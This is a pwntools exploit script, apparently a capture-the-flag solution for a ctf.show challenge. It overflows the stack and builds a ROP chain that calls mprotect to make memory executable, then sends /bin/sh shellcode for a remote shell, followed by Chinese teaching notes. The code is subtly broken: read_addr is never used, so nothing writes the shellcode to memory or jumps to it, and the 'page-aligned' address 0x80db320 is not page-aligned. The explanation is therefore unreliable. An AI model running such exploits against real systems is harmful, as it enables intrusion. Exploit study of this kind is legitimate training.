from pwn import *

p = remote('pwn.challenge.ctf.show', 28278)

offset = 0x12 + 4

mprotect_addr = 0x806CDD0
read_addr = 0x806BEE0
got_addr = 0x80db320
#这里为什么不能用bss段地址：因为mprotect要求addr必须是内存页的起始地址，简而言之为页大小（一般是 4KB == 4096
pop_eax_edx_ebx = 0x8056194

shellcode = asm(shellcraft.sh(), arch='i386', os='linux')

payload = b'a' * offset + p32(mprotect_addr) + p32(pop_eax_edx_ebx) + p32(got_addr) + p32(0x1000) + p32(7)

p.recvuntil('   * *********************************                        ')

p.sendline(payload)

p.sendline(shellcode)

p.interactive()

"""
【知识点讲解】
1. 题目类型：ret2shellcode - mprotect + 静态编译程序
2. 核心问题：
   - 静态编译程序没有libc，无法ret2libc
   - 程序开启了NX保护，栈/堆不可执行
   - 需要找到可执行的内存区域写入shellcode
3. mprotect函数：
   - 原型：int mprotect(void *addr, size_t len, int prot)
   - 功能：修改内存区域的保护属性
   - prot=7 (PROT_READ | PROT_WRITE | PROT_EXEC)：可读可写可执行
4. 页对齐要求：
   - mprotect要求addr必须是页大小的整数倍（通常是4KB=0x1000）
   - GOT表地址通常是页对齐的
5. payload结构：
   填充 + mprotect + pop_eax_edx_ebx + got_addr + 0x1000 + 7
6. 执行流程：
   - 调用mprotect(got_addr, 0x1000, 7)，将GOT表区域设为可执行
   - 发送shellcode到该内存区域
   - 跳转到shellcode执行
7. shellcraft.sh()：pwntools内置的/bin/sh shellcode
8. 关键点：绕过NX保护，将不可执行内存变为可执行
"""
